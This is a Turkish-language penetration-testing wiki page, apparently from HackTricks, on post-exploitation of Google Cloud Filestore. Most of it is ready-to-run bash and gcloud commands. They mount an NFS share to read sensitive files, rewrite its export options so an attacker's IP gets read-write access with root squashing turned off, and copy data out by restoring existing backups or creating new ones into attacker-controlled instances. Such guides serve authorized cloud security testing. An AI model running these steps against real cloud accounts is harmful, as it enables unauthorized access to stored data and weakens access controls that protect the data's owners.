# GCP - Filestore Sömürü Sonrası

{{#include ../../../banners/hacktricks-training.md}}

## Filestore

Filestore hakkında daha fazla bilgi için bakınız:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Mount Filestore

Paylaşılan bir dosya sistemi, saldırgan açısından ilgi çekici olabilecek **hassas bilgiler** içerebilir. Filestore'a erişimle bunu **bağlamak** mümkündür:

<details>

<summary>Filestore dosya sistemini bağlama</summary>
```bash
sudo apt-get update
sudo apt-get install nfs-common
# Check the share name
showmount -e <IP>
# Mount the share
mkdir /mnt/fs
sudo mount [FILESTORE_IP]:/[FILE_SHARE_NAME] /mnt/fs
```
</details>

Bir Filestore instance'ın IP address'ini bulmak için sayfadaki enumeration bölümünü kontrol edin:

{{#ref}}
../gcp-services/gcp-filestore-enum.md
{{#endref}}

### Kısıtlamaları kaldırma ve ek izinler alma

Eğer attacker, share üzerinde erişimi olan bir IP address'te değilse, ancak onu değiştirmek için yeterli permissions'a sahipseniz, kısıtlamaları veya erişimi kaldırmak mümkün olabilir. Ayrıca IP address'inize daha fazla ayrıcalık vererek share üzerinde admin access elde etmek de mümkün olabilir:

<details>

<summary>Filestore instance'ını erişime izin verecek şekilde güncelle</summary>
```bash
gcloud filestore instances update nfstest \
--zone=<exact-zone> \
--flags-file=nfs.json

# Contents of nfs.json
{
"--file-share":
{
"capacity": "1024",
"name": "<share-name>",
"nfs-export-options": [
{
"access-mode": "READ_WRITE",
"ip-ranges": [
"<your-ip-private-address>/32"
],
"squash-mode": "NO_ROOT_SQUASH",
"anon_uid": 1003,
"anon_gid": 1003
}
]
}
}
```
</details>

### Yedeği geri yükleme

Bir yedek varsa, mevcut bir instance'a veya yeni bir instance'a **geri yükleyerek** onun **bilgilerine erişmek** mümkündür:

<details>

<summary>Yeni instance oluştur ve yedeği geri yükle</summary>
```bash
# Create a new filestore if you don't want to modify the old one
gcloud filestore instances create <new-instance-name> \
--zone=<zone> \
--tier=STANDARD \
--file-share=name=vol1,capacity=1TB \
--network=name=default,reserved-ip-range=10.0.0.0/29

# Restore a backups in a new instance
gcloud filestore instances restore <new-instance-name> \
--zone=<zone> \
--file-share=<instance-file-share-name> \
--source-backup=<backup-name> \
--source-backup-region=<backup-region>

# Follow the previous section commands to mount it
```
</details>

### Yedek oluşturma ve geri yükleme

Eğer bir paylaşıma **erişiminiz yoksa ve onu değiştirmek istemiyorsanız**, ona **yedek oluşturmak** ve daha önce bahsedildiği gibi **geri yüklemek** mümkündür:

<details>

<summary>Yeni instance'da yedek oluşturma ve geri yükleme</summary>
```bash
# Create share backup
gcloud filestore backups create <back-name> \
--region=<region> \
--instance=<instance-name> \
--instance-zone=<instance-zone> \
--file-share=<share-name>

# Follow the previous section commands to restore it and mount it
```
</details>

{{#include ../../../banners/hacktricks-training.md}}
